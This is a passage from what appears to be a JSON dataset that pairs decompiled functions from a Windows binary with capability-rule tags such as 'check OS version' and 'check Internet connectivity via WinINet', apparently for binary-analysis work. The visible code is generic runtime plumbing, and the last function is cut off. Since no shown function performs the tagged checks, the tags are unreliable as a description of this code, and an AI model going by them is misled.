        "decompiled_code": "\nvoid __fastcall fcn.004158f4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t var_20h;\n    int32_t var_1ah;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_14h = &var_20h;\n    var_10h = *(*in_EAX + 0x18);\n    var_4h = in_EAX;\n    var_20h = fcn.004031a0();\n    while ((var_20h != 0 && (var_20h != *0x411d30))) {\n        var_20h = fcn.004031e4();\n    }\n    if (var_20h == 0) {\n        fcn.004158a8(&stack0xfffffffc);\n    }\n    unique0x00007a00 = *(var_20h + 0x18);\n    if (var_10h == unique0x00007a00) {\n        fcn.004158a8(&stack0xfffffffc);\n    }\n    (**(*var_4h + 0x18))(param_2, param_2 >> 0x1f);\n    return;\n}\n",
        "token_count": 289
    },
    "00415978": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.00415978(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x00415997:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x004159c1;\n            }\n            else if (arg_ch < 1) goto code_r0x004159c1;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x00415997;\n    fcn.0040b5f4();\n    fcn.004039e4();\ncode_r0x004159c1:\n    iVar1 = (**(*in_EAX + 0x14))();\n    return iVar1;\n}\n",
        "token_count": 220
    },
    "00415a58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415a58(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    int64_t iVar2;\n    uint uStackY52;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch == 0) && (iVar2 = CONCAT44(arg_ch, arg_8h),  arg_8h == 0)) {\n        uStackY52 = 0x415a7d;\n        fcn.004157dc(0, 0);\n        uStackY52 = 0x415a83;\n        iVar2 = (***in_EDX)();\n    }\n    arg_ch = iVar2 >> 0x20;\n    arg_8h = iVar2;\n    if (arg_ch == 0) {\n        if (arg_8h < 0xf001) {\ncode_r0x00415ab1:\n            var_14h = arg_8h;\n            goto code_r0x00415ab7;\n        }\n    }\n    else if (iVar2 < 0x100000000) goto code_r0x00415ab1;\n    var_14h = 0xf000;\ncode_r0x00415ab7:\n    fcn.004026bc();\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    do {\n        arg_ch = iVar2 >> 0x20;\n        arg_8h = iVar2;\n        if (iVar2 == 0) {\n            *in_FS_OFFSET = uStackY52;\n            fcn.004026dc();\n            return;\n        }\n        uVar1 = var_14h;\n        if (var_14h >> 0x1f == arg_ch) {\n            if (arg_8h <= var_14h) {\ncode_r0x00415ae9:\n                uVar1 = arg_8h;\n            }\n        }\n        else if (arg_ch <= var_14h >> 0x1f) goto code_r0x00415ae9;\n        fcn.004159e8();\n        fcn.00415a20();\n        iVar2 = iVar2 - uVar1;\n    } while( true );\n}\n",
        "token_count": 540
    },
    "00415cb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415cb4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa8;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x415cd7;\n        in_EAX = fcn.0040357c();\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x415ddd;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1h._0_1_ = in_DL;\n    if (arg_ch == -1) {\n        puStack72 = &fcn.00415cb4::var_1h + 1;\n        fcn.00408314();\n        fcn.00415bac();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040852c();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError();\n            fcn.0040ad30();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040b630(1, &fcn.00415cb4::var_14h);\n            fcn.004039e4();\n        }\n    }\n    else {\n        puStack72 = &fcn.00415cb4::var_1h + 1;\n        fcn.00408298();\n        fcn.00415bac();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040852c();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError();\n            fcn.0040ad30();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040b630(1, &fcn.00415cb4::var_14h);\n            fcn.004039e4();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffa8;\n    uStack80 = 0x415de4;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 651
    },
    "00416374": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.00416374(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    \n    for (pcVar2 = *(in_EAX + 0x14); (*pcVar2 != '\\0' && (*pcVar2 != '.')); pcVar2 = pcVar2 + 1) {\n    }\n    cVar1 = *pcVar2;\n    if (cVar1 != '\\0') {\n        fcn.00404098();\n        fcn.00404508();\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 129
    },
    "00416450": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416450(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4164f6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_2 != NULL) {\n        while (*param_2 != '\\0') {\n            for (; (*param_2 != '\\0' && (1 < *param_2 - 0x2dU)); param_2 = param_2 + 1) {\n            }\n            fcn.00404098();\n            iVar2 = fcn.00419a24();\n            if ((iVar2 == 0) && (cVar1 = fcn.00407c50(),  cVar1 != '\\0')) {\n                iVar2 = in_EAX;\n            }\n            if (iVar2 == 0) break;\n            if (*param_2 == '.') {\n                param_2 = param_2 + 1;\n            }\n            if (*param_2 == '-') {\n                param_2 = param_2 + 1;\n            }\n            in_EAX = iVar2;\n            if (*param_2 == '>') {\n                param_2 = param_2 + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4164fd;\n    uStack32 = 0x4164f5;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 395
    },
    "00416598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00416598(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x4165ab;\n    (**(**0x463848 + 0x14))();\n    uStack36 = 0x416731;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x4165c3;\n    puStack32 = &stack0xfffffffc;\n    iVar1 = fcn.00413ed0();\n    uStack48 = 0x416712;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    if (*(iVar1 + 8) < 1) {\n        *in_FS_OFFSET = uStack52;\n        puStack44 = 0x416719;\n        uStack48 = 0x416711;\n        fcn.00413f34();\n        return;\n    }\n    puStack56 = 0x4165e9;\n    puStack44 = &stack0xfffffffc;\n    fcn.00403228();\n    uStack60 = 0x4166f3;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x416606;\n    puStack56 = &stack0xfffffffc;\n    fcn.00403228();\n    uStack72 = 0x4166a1;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar5 = 0;\n    puStack68 = &stack0xfffffffc;\n    do {\n        while( true ) {\n            if (*(iVar1 + 8) <= iVar5) {\n                *in_FS_OFFSET = uStack76;\n                puStack68 = 0x4166a8;\n                uStack72 = 0x4166a0;\n                fcn.00403258();\n                return;\n            }\n            puVar2 = fcn.00413b64();\n            iVar3 = fcn.004136b0();\n            if (iVar3 == 0) break;\ncode_r0x00416646:\n            if (iVar3 != 0) {\n                fcn.00416450();\n                (***puVar2)();\n            }\n            fcn.00416518(&stack0xfffffffc);\n            fcn.00413a54();\n            fcn.00403258();\n        }\n        iVar4 = fcn.004109f4();\n        if (iVar4 != 0) goto code_r0x00416646;\n        fcn.00416550(&stack0xfffffffc);\n        iVar5 = iVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 725
    },
    "00416740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416740(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x463864 == 0) {\n        return;\n    }\n    puStack28 = 0x416766;\n    iVar2 = fcn.00413ed0();\n    uStack32 = 0x4167db;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(iVar2 + 8) + -1;\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = fcn.00413b64();\n            if ((in_EAX == 0) || (*(iVar3 + 8) == in_EAX)) {\n                if (param_2 != 0) {\n                    cVar1 = fcn.00407c50();\n                    if (cVar1 == '\\0') goto code_r0x004167bd;\n                }\n                fcn.00413a54();\n                fcn.00403258();\n            }\ncode_r0x004167bd:\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4167e2;\n    uStack32 = 0x4167da;\n    fcn.00413f34();\n    return;\n}\n",
        "token_count": 382
    },
    "004167ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004167ec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x463864 != 0) {\n        puStack24 = 0x416809;\n        iVar1 = fcn.00413ed0();\n        uStack28 = 0x416863;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack24 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00413b64();\n                if (*(iVar2 + 4) == in_EAX) {\n                    fcn.00413a54();\n                    fcn.00403258();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41686a;\n        uStack28 = 0x416862;\n        fcn.00413f34();\n        return;\n    }\n    return;\n}\n",
        "token_count": 293
    },
    "00416938": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416938(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00407c50();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        (*arg_10h)();\n        fcn.00403fa8();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0041696c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041696c(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x416985;\n    cVar1 = fcn.00407c50();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        puStack24 = 0x4169a0;\n        cVar1 = fcn.004187ec();\n        if (cVar1 != '\\n') {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n            puStack24 = 0x4169b2;\n            fcn.004188fc();\n            *(in_EAX + 0x78) = 1;\n            puStack24 = 0x4169be;\n            fcn.00416888();\n        }\n        puStack24 = 0x4169ca;\n        piVar2 = fcn.00403228();\n        uStack28 = 0x416a2d;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00416db0();\n        (**(*piVar2 + 4))();\n        fcn.00416db0();\n        *(in_EAX + 0x78) = 1;\n        (*arg_10h)();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x416a34;\n        uStack28 = 0x416a2c;\n        fcn.00403258();\n        return;\n    }\n    return;\n}\n",
        "token_count": 450
    },
    "00416ae4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00416ae4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x416af6;\n    iVar1 = fcn.00413ed0();\n    uStack24 = 0x416b54;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00413b64();\n            if ((*(iVar2 + 4) == *(in_EAX + 4)) && (*(iVar2 + 0xc) == *(in_EAX + 0xc))) {\n                fcn.00403258();\n                fcn.00413a54();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x416b5b;\n    uStack24 = 0x416b53;\n    fcn.00413f34();\n    return;\n}\n",
        "token_count": 298
    },
    "00417028": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __cdecl fcn.00417028(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    char in_DL;\n    int32_t iVar3;\n    uint var_3h;\n    \n    iVar2 = fcn.00404da0();\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        do {\n            if (in_DL == '\\0') {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = ~in_AX & *(iVar1 + 0x1c);\n            }\n            else {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = *(iVar1 + 0x1c) | in_AX;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00417110": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417110(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4171f6;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x417135;\n    iVar2 = fcn.00418c80();\n    *(arg_8h + -0x14) = 0;\n    if (*(*(arg_8h + -8) + 0x6a) != 0) {\n        puStack32 = arg_8h + -0x14;\n        uStack36 = 0x417167;\n        (**(*(arg_8h + -8) + 0x68))();\n    }\n    if (*(arg_8h + -0x14) == 0) {\n        puStack32 = 0x417175;\n        uVar3 = (**(iVar2 + -0xc))();\n        *(arg_8h + -0x14) = uVar3;\n        if ((*(arg_8h + -9) & 4) != 0) {\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 1;\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 0x200;\n        }\n        uStack36 = 0x4171ca;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        (**(**(arg_8h + -0x14) + 0x2c))();\n        *in_FS_OFFSET = uStack40;\n    }\n    puVar1 = *(arg_8h + -0x14) + 0x1c;\n    *puVar1 = *puVar1 | 1;\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 534
    },
    "004175a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004175a0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        puStack16 = 0x4175bf;\n        uVar1 = fcn.00403228();\n        *(in_EAX + 0x30) = uVar1;\n        uStack20 = 0x4175fb;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        fcn.00417610();\n        fcn.00416b60();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41760c;\n        uStack20 = 0x4175fa;\n        fcn.00416ca4();\n        return;\n    }\n    puStack16 = 0x41760c;\n    fcn.00417610();\n    return;\n}\n",
        "token_count": 252
    },
    "004179fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004179fc(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack308 = 0x417aed;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack312;\n    fcn.00403fa8();\n    cVar1 = fcn.004033e4();\n    if (cVar1 != '\\0') {\n        fcn.00404040();\n    }\n    if (var_4h == 0) {\n        fcn.004031a8();\n        fcn.0040420c();\n    }\n    var_124h = var_4h;\n    var_120h._0_1_ = 0xb;\n    var_11ch = **0x461f58;\n    var_118h._0_1_ = 0xb;\n    var_114h = *(arg_8h + -8);\n    var_110h._0_1_ = 0xb;\n    var_10ch = *(in_EAX + 4);\n    var_108h._0_1_ = 0xb;\n    uVar2 = 3;\n    fcn.0040b630(3, &var_124h);\n    fcn.004039e4();\n    *in_FS_OFFSET = uVar2;\n    uStack312 = 0x417af4;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 459
    },
    "00417b18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00417b18(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack72;\n    uint uStack68;\n    uchar *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack52 = &stack0xfffffffc;\n    uStack44 = 0x417ce8;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x417c9d;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x417b53;\n    fcn.00418610();\n    uStack68 = 0x417c76;\n    iStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    iVar4 = 1;\n    puStack64 = &stack0xfffffffc;\n    iVar2 = fcn.00404268();\n    *(in_EAX + 0x78) = 1;\n    var_10h = param_2;\n    while( true ) {\n        for (; (iVar4 <= iVar2 && (*(iVar4 + -1) != '.')); iVar4 = iVar4 + 1) {\n        }\n        iStack72 = in_EAX + 0x70;\n        fcn.004044c8();\n        if (iVar2 < iVar4) break;\n        fcn.00403498();\n        puVar3 = fcn.00410984();\n        if (puVar3 == NULL) {\n            fcn.00416d9c();\n        }\n        var_14h = NULL;\n        if (***puVar3 == '\\a') {\n            var_14h = fcn.004109f4();\n        }\n        cVar1 = fcn.004033e4();\n        if (cVar1 == '\\0') {\n            fcn.00417afc(&stack0xfffffffc);\n        }\n        var_10h = var_14h;\n        iVar4 = iVar4 + 1;\n    }\n    fcn.00403498();\n    iVar2 = fcn.00410984();\n    if (iVar2 == 0) {\n        *(in_EAX + 0x78) = 0;\n        (**(*var_10h + 4))();\n        *(in_EAX + 0x78) = 1;\n        if (*(in_EAX + 0x70) != 0) {\n            fcn.00416d9c();\n        }\n    }\n    else {\n        fcn.00417e9c();\n    }\n    *in_FS_OFFSET = iStack72;\n    *in_FS_OFFSET = iStack60;\n    *in_FS_OFFSET = iStack48;\n    puStack40 = 0x417cef;\n    uStack44 = 0x417ce7;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 769
    },
    "00417e9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __fastcall fcn.00417e9c(uint param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    uint *in_FS_OFFSET;\n    unkbyte10 Var4;\n    ulong uVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 5;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_ch = NULL;\n    var_18h = 0x418197;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00417e9c::var_1ch;\n    puVar1 = &stack0xfffffffc;\n    var_10h = unaff_EBX;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (*0x8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**_pe_dos_header == '\\a') {\n            fcn.004109f4();\n            cVar2 = fcn.004033e4();\n            puVar1 = var_14h;\n            if (cVar2 != '\\0') {\n                iVar3 = fcn.004109f4();\n                puVar1 = var_14h;\n                if ((*(iVar3 + 0x24) & 4) != 0) goto code_r0x00417f11;\n            }\n        }\n        var_14h = puVar1;\n        fcn.00416870();\n        puVar1 = var_14h;\n    }\ncode_r0x00417f11:\n    var_14h = puVar1;\n    if (***var_ch < 0x11) {\n    // switch table (17 cases) at 0x417f2c\n        switch(*(***var_ch * 4 + 0x417f2c)) {\n        case 0x417f70:\n            cVar2 = fcn.00416d8c();\n            if (cVar2 == '\\a') {\n                fcn.004177fc();\n                fcn.00417cf8();\n            }\n            else {\n                fcn.004178fc();\n                fcn.00410a68();\n            }\n            break;\n        case 0x417fb4:\n            fcn.00416e4c();\n            fcn.00410a68();\n            break;\n        case 0x417fd0:\n            fcn.004177fc();\n            fcn.00410920();\n            fcn.00410a68();\n            break;\n        case 0x417ff7:\n            Var4 = fcn.004176e0();\n            var_28h = Var4;\n            var_24h = Var4 >> 0x20;\n            fcn.00410cf8(var_28h, var_24h, CONCAT22(0x41, Var4 >> 0x40));\n            break;\n        case 0x418016:\n            fcn.0041864c();\n            fcn.00410bf8();\n            break;\n        case 0x418034:\n            fcn.00418708();\n            fcn.00410c24();\n            break;\n        case 0x418052:\n            fcn.00418530();\n            fcn.00410a68();\n            break;\n        case 0x41806e:\n            cVar2 = fcn.00416d8c();\n            if (cVar2 == '\\r') {\n                fcn.004187ec();\n                fcn.00410a68();\n 